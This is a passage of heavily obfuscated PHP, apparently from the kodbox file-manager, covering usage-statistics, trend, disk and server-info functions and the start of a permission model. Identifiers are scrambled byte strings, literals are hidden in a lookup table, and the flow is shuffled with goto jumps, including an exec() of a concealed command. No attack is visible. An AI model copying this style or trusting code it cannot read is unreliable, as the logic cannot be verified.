$CŒõÃÓÜ¼‡, $bÚÓ‹¡ì‰, $CùŠŒ†É¼‘, $B´ô°„¿ ); $b¡ß éË¥à =& $this->task; if ($b¡ß éË¥à[$eµ¥åÎ¸í[1581]] == $eµ¥åÎ¸í[309]) { $b¡ß éË¥à[$eµ¥åÎ¸í[1581]] = $eµ¥åÎ¸í[106]; } $this->update(); } public function copyFileEnd($c„Ñ’×“¸’, $F˜†çå·ç‹, $eö¾ìôÆ¼, $dÎœİ„—“, $aìğ¯™­Â­, $e½„Ÿâë‹÷) { $aÅ§‘Óòå¦ =& $_SERVER[Æ¼ôºÙï]; $bİô—¥ÏÃ‰ =& $this->task; $bİô—¥ÏÃ‰[$aÅ§‘Óòå¦[1548]] = $bİô—¥ÏÃ‰[$aÅ§‘Óòå¦[1547]]; $bİô—¥ÏÃ‰[$aÅ§‘Óòå¦[1552]] += $bİô—¥ÏÃ‰[$aÅ§‘Óòå¦[1547]]; $bİô—¥ÏÃ‰[$aÅ§‘Óòå¦[1549]] = $aÅ§‘Óòå¦[33]; $this->update(); } public function nameParse($bÍ÷ˆ¾ñ”ˆ) { $c—¶øÈ³ã =& $_SERVER[Æ¼ôºÙï]; $BÂÑŸ†‘÷¬ =& $this->task; if ($BÂÑŸ†‘÷¬[$c—¶øÈ³ã[1014]] < $BÂÑŸ†‘÷¬[$c—¶øÈ³ã[1000]]) { $CÄŒ©Ù†¶¨ = get_path_this($bÍ÷ˆ¾ñ”ˆ); if (strstr($CÄŒ©Ù†¶¨, $c—¶øÈ³ã[94])) { $BÂÑŸ†‘÷¬[$c—¶øÈ³ã[1014]] += 1; } } if ($BÂÑŸ†‘÷¬[$c—¶øÈ³ã[1581]] == $c—¶øÈ³ã[1073]) { $BÂÑŸ†‘÷¬[$c—¶øÈ³ã[1581]] = $c—¶øÈ³ã[309]; } $BÂÑŸ†‘÷¬[$c—¶øÈ³ã[1545]] = $bÍ÷ˆ¾ñ”ˆ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($B»²¿Â×ˆŒ) { $cÒ¡äé³‡ =& $_SERVER[Æ¼ôºÙï]; $f«ó›µ®Ã = array($cÒ¡äé³‡[551] => array($cÒ¡äé³‡[29] => $cÒ¡äé³‡[1586], $cÒ¡äé³‡[269] => array($cÒ¡äé³‡[220], $cÒ¡äé³‡[719], $cÒ¡äé³‡[1587], $cÒ¡äé³‡[1588])), $cÒ¡äé³‡[1589] => array($cÒ¡äé³‡[29] => $cÒ¡äé³‡[1590], $cÒ¡äé³‡[269] => array($cÒ¡äé³‡[220], $cÒ¡äé³‡[717], $cÒ¡äé³‡[1591], $cÒ¡äé³‡[1592], $cÒ¡äé³‡[1593]))); if (!isset($f«ó›µ®Ã[$B»²¿Â×ˆŒ])) { return !1; } $this->optionType = $f«ó›µ®Ã[$B»²¿Â×ˆŒ][$cÒ¡äé³‡[29]]; $this->field = $f«ó›µ®Ã[$B»²¿Â×ˆŒ][$cÒ¡äé³‡[269]]; return !0; } public function listData($DŠÅ¢Œ­´õ = false, $A„±¨äÛÎ = "\155\x6f\x64\x69\x66\x79\124\151\x6d\x65", $cŒÅ«…ˆÚ = false) { return parent::listData($DŠÅ¢Œ­´õ, $A„±¨äÛÎ, $cŒÅ«…ˆÚ); } public function trendList($E‘®Ü×‡) { goto D²Ë¿ãí‚ë; D²Ë¿ãí‚ë: $FæÀğ„±ÙÆ =& $_SERVER[Æ¼ôºÙï]; $AË·‚¦£Œ… = $this->listData(); if ($AË·‚¦£Œ…) { $còŒÇÀ†Òª = end($AË·‚¦£Œ…); $F§‰½ƒ‘å½ = date($FæÀğ„±ÙÆ[1594], strtotime($FæÀğ„±ÙÆ[1595])); if ($còŒÇÀ†Òª[$FæÀğ„±ÙÆ[220]] == $F§‰½ƒ‘å½) { return $AË·‚¦£Œ…; } $có¾‹Ô´£¾ = strtotime($còŒÇÀ†Òª[$FæÀğ„±ÙÆ[220]]); } goto bÌ‡—¾©îÂ; bÌ‡—¾©îÂ: if (!isset($có¾‹Ô´£¾)) { $BÕËƒ–ŠÀ = $E‘®Ü×‡ == $FæÀğ„±ÙÆ[551] ? $FæÀğ„±ÙÆ[495] : $FæÀğ„±ÙÆ[770]; $có¾‹Ô´£¾ = Model($BÕËƒ–ŠÀ)->min($FæÀğ„±ÙÆ[192]); } $AÄ‚À×¦† = $FæÀğ„±ÙÆ[1596] . ucfirst($E‘®Ü×‡); $fšõÏæÊî = $this->dateList($có¾‹Ô´£¾); goto FÙÄ‹£â; FÙÄ‹£â: foreach ($fšõÏæÊî as $F§‰½ƒ‘å½) { $this->{$AÄ‚À×¦†}($F§‰½ƒ‘å½); } return $this->listData(); goto fÈäÃãĞµÓ; fÈäÃãĞµÓ: } private function dateList($FĞİÚ²É„·) { $a®×é¨…Ãï =& $_SERVER[Æ¼ôºÙï]; $A»÷íâ‹ƒ = $FĞİÚ²É„·; $eÀÉÉ¡½Ù‚ = strtotime($a®×é¨…Ãï[1595]); $b´Ã•¢ğ¾Á = array(); while ($A»÷íâ‹ƒ <= $eÀÉÉ¡½Ù‚) { $b´Ã•¢ğ¾Á[] = date($a®×é¨…Ãï[1594], $A»÷íâ‹ƒ); $A»÷íâ‹ƒ = strtotime($a®×é¨…Ãï[1597], $A»÷íâ‹ƒ); } return $b´Ã•¢ğ¾Á; } public function _recordUser($cğ¦µ…®“‡ = '') { goto dÀ™¼âê‡¹; dÀ™¼âê‡¹: $FÒô‡ê× =& $_SERVER[Æ¼ôºÙï]; $F°Û‡®”« = strtotime(date($FÒô‡ê×[1598], strtotime($cğ¦µ…®“‡))); $CÑŒé Ìø = strtotime(date($FÒô‡ê×[1599], strtotime($cğ¦µ…®“‡))); goto DóÇ¶´ÀÍ·; DóÇ¶´ÀÍ·: $få¼¹¼’ºË = array($FÒô‡ê×[192] => array($FÒô‡ê×[949], $CÑŒé Ìø)); $CÇ‹‘ÊÆõç = Model($FÒô‡ê×[495])->where($få¼¹¼’ºË)->count($FÒô‡ê×[1502]); $få¼¹¼’ºË[$FÒô‡ê×[192]] = array($FÒô‡ê×[329], array($F°Û‡®”«, $CÑŒé Ìø)); goto FÈÃ‰ĞÈ÷ô; FÈÃ‰ĞÈ÷ô: $bÓÂ„„à…¤ = Model($FÒô‡ê×[495])->where($få¼¹¼’ºË)->count($FÒô‡ê×[1502]); $få¼¹¼’ºË[$FÒô‡ê×[29]] = $FÒô‡ê×[1600]; $f««‘ˆÛÇù = Model($FÒô‡ê×[1601])->where($få¼¹¼’ºË)->count($FÒô‡ê×[1602]); goto CíßÔì½’™; CíßÔì½’™: $Dó§À×¢·† = array($FÒô‡ê×[220] => $cğ¦µ…®“‡, $FÒô‡ê×[719] => (int) $CÇ‹‘ÊÆõç, $FÒô‡ê×[1587] => (int) $bÓÂ„„à…¤, $FÒô‡ê×[1588] => (int) $f««‘ˆÛÇù); return $this->insert($Dó§À×¢·†); goto B£†©íìÀ; B£†©íìÀ: } public function _recordStore($C´‡Í¿¸½Í = '') { goto BøÑæ¹Öˆ; cŠòœÈ³: $D¯ ›‡Ñ¹[$cãõ¥¿Ûí[389]] = 1; $bÆ¼§ŸËÂ› = Model($cãõ¥¿Ûí[770])->where($D¯ ›‡Ñ¹)->sum($cãõ¥¿Ûí[77]); $D¯ ›‡Ñ¹[$cãõ¥¿Ûí[389]] = 2; goto dò“·è´ö; BøÑæ¹Öˆ: $cãõ¥¿Ûí =& $_SERVER[Æ¼ôºÙï]; $DŒôö©¶˜ò = strtotime(date($cãõ¥¿Ûí[1599], strtotime($C´‡Í¿¸½Í))); $D¯ ›‡Ñ¹ = array($cãõ¥¿Ûí[192] => array($cãõ¥¿Ûí[949], $DŒôö©¶˜ò)); goto d„Å×¬ëî; dò“·è´ö: $då™íÉÃñˆ = Model($cãõ¥¿Ûí[770])->where($D¯ ›‡Ñ¹)->sum($cãõ¥¿Ûí[77]); $Cª¬—İéÖ = array($cãõ¥¿Ûí[220] => $C´‡Í¿¸½Í, $cãõ¥¿Ûí[717] => (int) $Eµ¿ÕğÑ¶, $cãõ¥¿Ûí[1591] => (int) $b†»†‡ï³å, $cãõ¥¿Ûí[1592] => (int) $bÆ¼§ŸËÂ›, $cãõ¥¿Ûí[1593] => (int) $då™íÉÃñˆ); return $this->insert($Cª¬—İéÖ); goto cÄ‚”¬­°¹; d„Å×¬ëî: $b†»†‡ï³å = Model($cãõ¥¿Ûí[439])->where($D¯ ›‡Ñ¹)->sum($cãõ¥¿Ûí[77]); $D¯ ›‡Ñ¹[$cãõ¥¿Ûí[388]] = 0; $Eµ¿ÕğÑ¶ = Model($cãõ¥¿Ûí[770])->where($D¯ ›‡Ñ¹)->sum($cãõ¥¿Ûí[77]); goto cŠòœÈ³; cÄ‚”¬­°¹: } public function trend($EŞÙ†¶‰åº, $D«³Ûò¢å¤) { goto CÄÚÈº–ªÄ; d™ÊÆÙŸ¼†: if ($FàöÆƒù¡Á && $D«³Ûò¢å¤ != $BÌöòˆ…Ã‡[1476]) { $dŒ°”š…› = $FàöÆƒù¡Á[0][$BÌöòˆ…Ã‡[220]]; $Aš¾ôÀÉÜ = $this->validDate($D«³Ûò¢å¤, $dŒ°”š…›); $Cì‹¦Œ˜İ = array(); $dİÊ¯÷ÑŠ‘ = array_to_keyvalue($FàöÆƒù¡Á, $BÌöòˆ…Ã‡[220]); foreach ($Aš¾ôÀÉÜ as $bÒ¢Ğºù½æ) { if (isset($dİÊ¯÷ÑŠ‘[$bÒ¢Ğºù½æ])) { $EŒ‡Ø¡’ª  = $dİÊ¯÷ÑŠ‘[$bÒ¢Ğºù½æ]; } else { $EŒ‡Ø¡’ª  = end($FàöÆƒù¡Á); $EŒ‡Ø¡’ª [$BÌöòˆ…Ã‡[220]] = $bÒ¢Ğºù½æ; if ($EŞÙ†¶‰åº == $BÌöòˆ…Ã‡[551]) { $EŒ‡Ø¡’ª [$BÌöòˆ…Ã‡[1587]] = $EŒ‡Ø¡’ª [$BÌöòˆ…Ã‡[1588]] = 0; } } $Cì‹¦Œ˜İ[] = $EŒ‡Ø¡’ª ; } $FàöÆƒù¡Á = $Cì‹¦Œ˜İ; } $F‘ÌÓ„ æ = array($BÌöòˆ…Ã‡[551] => array($BÌöòˆ…Ã‡[719] => LNG($BÌöòˆ…Ã‡[1603]), $BÌöòˆ…Ã‡[1587] => LNG($BÌöòˆ…Ã‡[1604]), $BÌöòˆ…Ã‡[1588] => LNG($BÌöòˆ…Ã‡[1605])), $BÌöòˆ…Ã‡[1589] => array($BÌöòˆ…Ã‡[717] => LNG($BÌöòˆ…Ã‡[1606]), $BÌöòˆ…Ã‡[1591] => LNG($BÌöòˆ…Ã‡[1607]), $BÌöòˆ…Ã‡[1592] => LNG($BÌöòˆ…Ã‡[1608]), $BÌöòˆ…Ã‡[1593] => LNG($BÌöòˆ…Ã‡[1609]))); $AñÅ‚ä‡¬ê = array($BÌöòˆ…Ã‡[551] => $BÌöòˆ…Ã‡[1610], $BÌöòˆ…Ã‡[1589] => $BÌöòˆ…Ã‡[77]); goto eŠ÷Óã™ƒÀ; AÑÌ¶ÁÈ§‰: return $CõÃŒ¯ŠÜ; goto Fè’§¥Ã†; eŠ÷Óã™ƒÀ: if (empty($FàöÆƒù¡Á)) { $bÒ¢Ğºù½æ = date($BÌöòˆ…Ã‡[1594], strtotime($BÌöòˆ…Ã‡[1595])); $D›öî‹¼Á = array($BÌöòˆ…Ã‡[220] => $bÒ¢Ğºù½æ); foreach ($F‘ÌÓ„ æ[$EŞÙ†¶‰åº] as $b¥¹íœ¢§ => $BÇø¹æÅ˜œ) { $D›öî‹¼Á[$b¥¹íœ¢§] = 0; } $FàöÆƒù¡Á[] = $D›öî‹¼Á; } $CõÃŒ¯ŠÜ = array(); foreach ($FàöÆƒù¡Á as $BÇø¹æÅ˜œ) { if ($EŞÙ†¶‰åº == $BÌöòˆ…Ã‡[1589] && $BÇø¹æÅ˜œ[$BÌöòˆ…Ã‡[1591]] > $BÇø¹æÅ˜œ[$BÌöòˆ…Ã‡[717]]) { $BÇø¹æÅ˜œ[$BÌöòˆ…Ã‡[1591]] = $BÇø¹æÅ˜œ[$BÌöòˆ…Ã‡[717]]; } foreach ($F‘ÌÓ„ æ[$EŞÙ†¶‰åº] as $b¥¹íœ¢§ => $B—ÑÍËÎ—Ó) { $EŒ‡Ø¡’ª  = array($BÌöòˆ…Ã‡[220] => $BÇø¹æÅ˜œ[$BÌöòˆ…Ã‡[220]], $BÌöòˆ…Ã‡[1407] => $B—ÑÍËÎ—Ó); $EŒ‡Ø¡’ª [$AñÅ‚ä‡¬ê[$EŞÙ†¶‰åº]] = isset($BÇø¹æÅ˜œ[$b¥¹íœ¢§]) ? $BÇø¹æÅ˜œ[$b¥¹íœ¢§] : 0; $CõÃŒ¯ŠÜ[] = $EŒ‡Ø¡’ª ; } } goto AÑÌ¶ÁÈ§‰; CÄÚÈº–ªÄ: $BÌöòˆ…Ã‡ =& $_SERVER[Æ¼ôºÙï]; if (!$this->init($EŞÙ†¶‰åº)) { return !1; } $FàöÆƒù¡Á = $this->trendList($EŞÙ†¶‰åº); goto d™ÊÆÙŸ¼†; Fè’§¥Ã†: } public function validDate($a¬ã„å¡™ˆ, $B·¦¾Œ¤ ¬) { goto a‡‡‚ö; C´…¬‹ÎÇ–: switch ($a¬ã„å¡™ˆ) { case $BË¦”ëƒäë[1483]: $cší²ğÏ¿ê = mktime(0, 0, 0, date($BË¦”ëƒäë[1611]), date($BË¦”ëƒäë[1228]) - date($BË¦”ëƒäë[1290]) + 7 - 7, date($BË¦”ëƒäë[1612])); $C‚½îİêğ® = 0; do { $bœ–´µã© = date($BË¦”ëƒäë[1594], $cší²ğÏ¿ê - 3600 * 24 * 7 * $C‚½îİêğ®); $BŒ‹•Å°¼[] = $bœ–´µã©; $C‚½îİêğ®++; } while ($B·¦¾Œ¤ ¬ < $bœ–´µã©); break; case $BË¦”ëƒäë[1481]: $C‚½îİêğ® = 1; do { $aš­ÆÆ…ô³ = date($BË¦”ëƒäë[1613], strtotime("\x2d\x20{$C‚½îİêğ®}\x20\x6d\x6f\x6e\x74\150\x73")); $BŒ‹•Å°¼[] = $aš­ÆÆ…ô³; $C‚½îİêğ®++; } while ($B·¦¾Œ¤ ¬ < $aš­ÆÆ…ô³); break; case $BË¦”ëƒäë[1614]: $e£•´•ìÓâ = (int) date($BË¦”ëƒäë[1612], strtotime($B·¦¾Œ¤ ¬)); $E´Ò¬¾ñ = (int) date($BË¦”ëƒäë[1612]); if ($e£•´•ìÓâ >= $E´Ò¬¾ñ) { break; } for ($e£•´•ìÓâ; $e£•´•ìÓâ < $E´Ò¬¾ñ; $e£•´•ìÓâ++) { $BŒ‹•Å°¼[] = $e£•´•ìÓâ . $BË¦”ëƒäë[1615]; } break; default: break; } if ($B·¦¾Œ¤ ¬ > end($BŒ‹•Å°¼)) { array_pop($BŒ‹•Å°¼); } sort($BŒ‹•Å°¼); goto EŒ¾æ„Ñ‚‹; a‡‡‚ö: $BË¦”ëƒäë =& $_SERVER[Æ¼ôºÙï]; $F—Àµ“Şàõ = date($BË¦”ëƒäë[1594], strtotime($BË¦”ëƒäë[1595])); $BŒ‹•Å°¼ = array($F—Àµ“Şàõ); goto C´…¬‹ÎÇ–; EŒ¾æ„Ñ‚‹: return $BŒ‹•Å°¼; goto a½à¼Üİ„; a½à¼Üİ„: } public function listTable($Eìğ·¥Ğ¸½) { $A¡å÷œ¬ = ucfirst($Eìğ·¥Ğ¸½); return Model($A¡å÷œ¬)->listData(); } public function option($bìæ“í£®ï) { $EŒàè®»©Ë = $_SERVER[Æ¼ôºÙï][1616] . ucfirst($bìæ“í£®ï); return $this->{$EŒàè®»©Ë}(); } private function optionUser() { goto eòÁ¾ƒ÷¡±; eòÁ¾ƒ÷¡±: $a¸ÇôË‚ÊÓ =& $_SERVER[Æ¼ôºÙï]; $E…©„ôî‚ = Model($a¸ÇôË‚ÊÓ[495])->count($a¸ÇôË‚ÊÓ[1502]); $B‡±‚æŠŞŒ = Model($a¸ÇôË‚ÊÓ[495])->where($a¸ÇôË‚ÊÓ[1617])->count($a¸ÇôË‚ÊÓ[1502]); goto d¯‹å×ÆÆ™; Fò‚ä¿‚‘: if (!$CÎñíà÷¬İ) { $CÎñíà÷¬İ = 1; } $F’‘¡®ÏŒà = strtotime(date($a¸ÇôË‚ÊÓ[1598])); $Fá‚ô‘´ŞŸ = array($a¸ÇôË‚ÊÓ[1619] => array($a¸ÇôË‚ÊÓ[950], $F’‘¡®ÏŒà)); goto DÖÄ„ß¦Ÿí; d¯‹å×ÆÆ™: $F’‘¡®ÏŒà = strtotime($a¸ÇôË‚ÊÓ[1618]); $Fá‚ô‘´ŞŸ = array($a¸ÇôË‚ÊÓ[1619] => array($a¸ÇôË‚ÊÓ[950], $F’‘¡®ÏŒà)); $CÎñíà÷¬İ = (int) Model($a¸ÇôË‚ÊÓ[495])->where($Fá‚ô‘´ŞŸ)->count($a¸ÇôË‚ÊÓ[1502]); goto Fò‚ä¿‚‘; DÖÄ„ß¦Ÿí: $e™• ´ˆ”­ = Model($a¸ÇôË‚ÊÓ[495])->where($Fá‚ô‘´ŞŸ)->count($a¸ÇôË‚ÊÓ[1502]); return array($a¸ÇôË‚ÊÓ[714] => (int) $E…©„ôî‚, $a¸ÇôË‚ÊÓ[1620] => (int) ($E…©„ôî‚ - $B‡±‚æŠŞŒ), $a¸ÇôË‚ÊÓ[1621] => (int) $B‡±‚æŠŞŒ, $a¸ÇôË‚ÊÓ[1622] => (int) $e™• ´ˆ”­, $a¸ÇôË‚ÊÓ[1623] => $CÎñíà÷¬İ); goto A‰Ï¡áÑŠÁ; A‰Ï¡áÑŠÁ: } private function optionFile() { goto E¥…ƒóë¬‘; AŸƒ„’ÜÈ: $fÏğˆİ›Œ = Model($B¶Å×šŠ[770])->where($d„¼Ö”ä)->sum($B¶Å×šŠ[77]); $fÓîİ —òŸ = Model($B¶Å×šŠ[770])->where($d„¼Ö”ä)->count($B¶Å×šŠ[387]); return array($B¶Å×šŠ[717] => $bŠ‡¦Ã™¿, $B¶Å×šŠ[1591] => $B•¿§ÆğĞ‹, $B¶Å×šŠ[1624] => $bŠ‡¦Ã™¿ - $B•¿§ÆğĞ‹, $B¶Å×šŠ[1625] => (int) $fÏğˆİ›Œ, $B¶Å×šŠ[719] => (int) $e«ìĞò‹´, $B¶Å×šŠ[1626] => (int) $fÓîİ —òŸ); goto E•Û§ÛŒáç; fè–—‚â¡ì: $B•¿§ÆğĞ‹ = $DĞêªÒÀÀß[$B¶Å×šŠ[1591]]; $e«ìĞò‹´ = Model($B¶Å×šŠ[770])->where(array($B¶Å×šŠ[388] => 0))->count($B¶Å×šŠ[387]); $d„¼Ö”ä = array($B¶Å×šŠ[388] => 0, $B¶Å×šŠ[192] => array($B¶Å×šŠ[950], strtotime(date($B¶Å×šŠ[1598])))); goto AŸƒ„’ÜÈ; E¥…ƒóë¬‘: $B¶Å×šŠ =& $_SERVER[Æ¼ôºÙï]; $DĞêªÒÀÀß = $this->sourceSize(); $bŠ‡¦Ã™¿ = $DĞêªÒÀÀß[$B¶Å×šŠ[77]]; goto fè–—‚â¡ì; E•Û§ÛŒáç: } private function optionAccess() { $eèº‡—Ä  =& $_SERVER[Æ¼ôºÙï]; return array($eèº‡—Ä [714] => $this->typeLogCnt(), $eèº‡—Ä [106] => $this->typeLogCnt($eèº‡—Ä [106]), $eèº‡—Ä [421] => $this->typeLogCnt($eèº‡—Ä [421]), $eèº‡—Ä [1627] => $this->typeLogCnt($eèº‡—Ä [1627]), $eèº‡—Ä [1628] => $this->typeLogCnt($eèº‡—Ä [1628]), $eèº‡—Ä [551] => $this->typeLogCnt($eèº‡—Ä [33], $eèº‡—Ä [1602])); } private function typeLogCnt($DõŒ¹°ÔÎ‹ = '', $Cß®­óØÄ„ = "\151\144") { goto EŞ£í½ˆ”õ; cêá•îƒâˆ: return (int) $b•…âø; goto EœÈ•°äÏÈ; C¶‰äÕäê»: $Fƒ® Ï”Œß = array($cÇàºÑ‘˜§[192] => array($cÇàºÑ‘˜§[950], $Aøö …¯ëì)); if ($DõŒ¹°ÔÎ‹) { $Fƒ® Ï”Œß[$cÇàºÑ‘˜§[29]] = array($cÇàºÑ‘˜§[7], $C‚×æÓ„Œ[$DõŒ¹°ÔÎ‹]); } $b•…âø = Model($cÇàºÑ‘˜§[1601])->where($Fƒ® Ï”Œß)->count($Cß®­óØÄ„); goto cêá•îƒâˆ; EŞ£í½ˆ”õ: $cÇàºÑ‘˜§ =& $_SERVER[Æ¼ôºÙï]; $C‚×æÓ„Œ = array($cÇàºÑ‘˜§[106] => array($cÇàºÑ‘˜§[1629], $cÇàºÑ‘˜§[1630]), $cÇàºÑ‘˜§[421] => array($cÇàºÑ‘˜§[1631], $cÇàºÑ‘˜§[1632]), $cÇàºÑ‘˜§[1627] => array($cÇàºÑ‘˜§[1633], $cÇàºÑ‘˜§[1634], $cÇàºÑ‘˜§[1635]), $cÇàºÑ‘˜§[1628] => array($cÇàºÑ‘˜§[1636], $cÇàºÑ‘˜§[1637]), $cÇàºÑ‘˜§[1638] => array($cÇàºÑ‘˜§[1639], $cÇàºÑ‘˜§[1640], $cÇàºÑ‘˜§[1641])); $Aøö …¯ëì = strtotime(date($cÇàºÑ‘˜§[1598])); goto C¶‰äÕäê»; EœÈ•°äÏÈ: } private function optionServer() { goto f¨Ó›³¦º; f¨Ó›³¦º: $aƒ²­’èÆö =& $_SERVER[Æ¼ôºÙï]; $cÛòÚ Øå¯ = $this->diskDriver(); $Eâ’Æ–…íŸ = KodIO::defaultDriver(); goto E²ØšÜøÑ; DÒçíŠñÅ¹: return array($aƒ²­’èÆö[1644] => $cÛòÚ Øå¯ ? $cÛòÚ Øå¯[$aƒ²­’èÆö[1645]] : 0, $aƒ²­’èÆö[1646] => $cÛòÚ Øå¯ ? $cÛòÚ Øå¯[$aƒ²­’èÆö[1647]] : 0, $aƒ²­’èÆö[1648] => (int) $Eâ’Æ–…íŸ[$aƒ²­’èÆö[1645]] * 1024 * 1024 * 1024, $aƒ²­’èÆö[1649] => (int) $c‹°¯‡Øã, $aƒ²­’èÆö[1650] => ucfirst($Dß™õ»¼õ‰), $aƒ²­’èÆö[1651] => $aƒ²­’èÆö[1652] . PHP_VERSION, $aƒ²­’èÆö[1653] => phpBuild64() ? 64 : 32, $aƒ²­’èÆö[713] => str_replace($aƒ²­’èÆö[1654], $aƒ²­’èÆö[927], $AÊçÒ¾„’ö), $aƒ²­’èÆö[345] => ucfirst($EŸö¤Œæ‡­), $aƒ²­’èÆö[28] => $_SERVER[$aƒ²­’èÆö[1655]]); goto Eº™›¸­±«; a™ÉëÙà·Œ: if ($AÊçÒ¾„’ö == $aƒ²­’èÆö[742]) { $d³³Üï±†œ = explode($aƒ²­’èÆö[1142], $a«¿»—Ûß‡[$aƒ²­’èÆö[910]]); $AÊçÒ¾„’ö = $d³³Üï±†œ[0]; } if ($AÊçÒ¾„’ö == $aƒ²­’èÆö[745] || $AÊçÒ¾„’ö == $aƒ²­’èÆö[746]) { $e„¸ÍÙ™‰ê = Model()->db()->query($aƒ²­’èÆö[1642]); $dİ¡§å÷¯ = $e„¸ÍÙ™‰ê[0] && isset($e„¸ÍÙ™‰ê[0][$aƒ²­’èÆö[1406]]) ? $e„¸ÍÙ™‰ê[0][$aƒ²­’èÆö[1406]] : 0; $AÊçÒ¾„’ö = $aƒ²­’èÆö[1643] . ($dİ¡§å÷¯ ? $aƒ²­’èÆö[8] . $dİ¡§å÷¯ : $aƒ²­’èÆö[33]); } $EŸö¤Œæ‡­ = $GLOBALS[$aƒ²­’èÆö[6]][$aƒ²­’èÆö[345]][$aƒ²­’èÆö[772]]; goto DÒçíŠñÅ¹; E²ØšÜøÑ: $F©Ñº™Ê§Ê = array($aƒ²­’èÆö[762] => $Eâ’Æ–…íŸ[$aƒ²­’èÆö[385]]); $c‹°¯‡Øã = Model($aƒ²­’èÆö[439])->where($F©Ñº™Ê§Ê)->sum($aƒ²­’èÆö[77]); $cƒù•¢ÎÈç = explode($aƒ²­’èÆö[50], $_SERVER[$aƒ²­’èÆö[141]]); goto aÖº»¾ë‹½; aÖº»¾ë‹½: $Dß™õ»¼õ‰ = $cƒù•¢ÎÈç[0]; $a«¿»—Ûß‡ = $GLOBALS[$aƒ²­’èÆö[6]][$aƒ²­’èÆö[17]]; $AÊçÒ¾„’ö = $a«¿»—Ûß‡[$aƒ²­’èÆö[911]]; goto a™ÉëÙà·Œ; Eº™›¸­±«: } private function diskDriver() { goto A ¼ÉªÇ²; DÜƒ£øÖÜ: $eÅˆãºÄÊ† = $cÉË‹ê¢Ã - @disk_free_space($AŸí’¾ø‹); return array($FÌÉªÚ·æÜ[1645] => $cÉË‹ê¢Ã, $FÌÉªÚ·æÜ[1647] => $eÅˆãºÄÊ†); goto Fîä‹«Ş; A ¼ÉªÇ²: $FÌÉªÚ·æÜ =& $_SERVER[Æ¼ôºÙï]; $AŸí’¾ø‹ = $FÌÉªÚ·æÜ[8]; $fŞ¸Õ°Û‡ = $GLOBALS[$FÌÉªÚ·æÜ[6]][$FÌÉªÚ·æÜ[1656]] == $FÌÉªÚ·æÜ[1657]; goto EÚóõš›ß‘; EÚóõš›ß‘: if ($fŞ¸Õ°Û‡) { $AŸí’¾ø‹ = $FÌÉªÚ·æÜ[1658]; if (function_exists($FÌÉªÚ·æÜ[1659])) { exec($FÌÉªÚ·æÜ[1660], $f†ÇÛØ†é×); $AŸí’¾ø‹ = $f†ÇÛØ†é×[1] . $FÌÉªÚ·æÜ[8]; } } if (!file_exists($AŸí’¾ø‹)) { return; } $cÉË‹ê¢Ã = @disk_total_space($AŸí’¾ø‹); goto DÜƒ£øÖÜ; Fîä‹«Ş: } public function fileChart($f¾ ‚½×ì™) { goto a¥·¬‘Àí; dÑØÀ…‹¼º: $dÖ†·¯¹õ‘ = $this->sourceSize(); $fïĞ†ñ°Ú¸ = array($a¿¹Š„‚[479] => 0, $a¿¹Š„‚[389] => 1); $CÑ­µí¤… = Model($a¿¹Š„‚[770])->where($fïĞ†ñ°Ú¸)->sum($a¿¹Š„‚[77]); goto c…‘ï‰””Ã; a¥·¬‘Àí: $a¿¹Š„‚ =& $_SERVER[Æ¼ôºÙï]; if (isset($f¾ ‚½×ì™[$a¿¹Š„‚[1502]])) { return Model($a¿¹Š„‚[770])->userFileTypeProfile($f¾ ‚½×ì™[$a¿¹Š„‚[1502]]); } if (isset($f¾ ‚½×ì™[$a¿¹Š„‚[1661]])) { return Model($a¿¹Š„‚[770])->groupFileTypeProfile($f¾ ‚½×ì™[$a¿¹Š„‚[1661]]); } goto dÑØÀ…‹¼º; c…‘ï‰””Ã: $fïĞ†ñ°Ú¸[$a¿¹Š„‚[389]] = 2; $c›ƒ”Ñ…°å = Model($a¿¹Š„‚[770])->where($fïĞ†ñ°Ú¸)->sum($a¿¹Š„‚[77]); return array($a¿¹Š„‚[717] => $dÖ†·¯¹õ‘[$a¿¹Š„‚[77]], $a¿¹Š„‚[1591] => $dÖ†·¯¹õ‘[$a¿¹Š„‚[1591]], $a¿¹Š„‚[1592] => (int) $CÑ­µí¤…, $a¿¹Š„‚[1593] => (int) $c›ƒ”Ñ…°å); goto DŒéˆ„—ñõ; DŒéˆ„—ñõ: } private function sourceSize() { $a ¶§‹¾ä =& $_SERVER[Æ¼ôºÙï]; $Aë£øÔ„òä = Model($a ¶§‹¾ä[770])->where(array($a ¶§‹¾ä[388] => 0))->sum($a ¶§‹¾ä[77]); $BÌ¦†«°Ì¯ = Model($a ¶§‹¾ä[439])->sum($a ¶§‹¾ä[77]); if ($BÌ¦†«°Ì¯ > $Aë£øÔ„òä) { $BÌ¦†«°Ì¯ = $Aë£øÔ„òä; } return array($a ¶§‹¾ä[77] => (int) $Aë£øÔ„òä, $a ¶§‹¾ä[1591] => (int) $BÌ¦†«°Ì¯); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $bãÇ—êÛå =& $_SERVER[Æ¼ôºÙï]; $eí¸ĞÂà÷± = array(array($bãÇ—êÛå[404] => LNG($bãÇ—êÛå[1662]), $bãÇ—êÛå[1663] => $bãÇ—êÛå[1664], $bãÇ—êÛå[1665] => 1, $bãÇ—êÛå[1666] => 1, $bãÇ—êÛå[1667] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($bãÇ—êÛå[404] => LNG($bãÇ—êÛå[1668]), $bãÇ—êÛå[1663] => $bãÇ—êÛå[1669], $bãÇ—êÛå[1665] => 2, $bãÇ—êÛå[1666] => 1, $bãÇ—êÛå[1667] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($bãÇ—êÛå[404] => LNG($bãÇ—êÛå[1670]), $bãÇ—êÛå[1663] => $bãÇ—êÛå[1671], $bãÇ—êÛå[1665] => 3, $bãÇ—êÛå[1666] => 1, 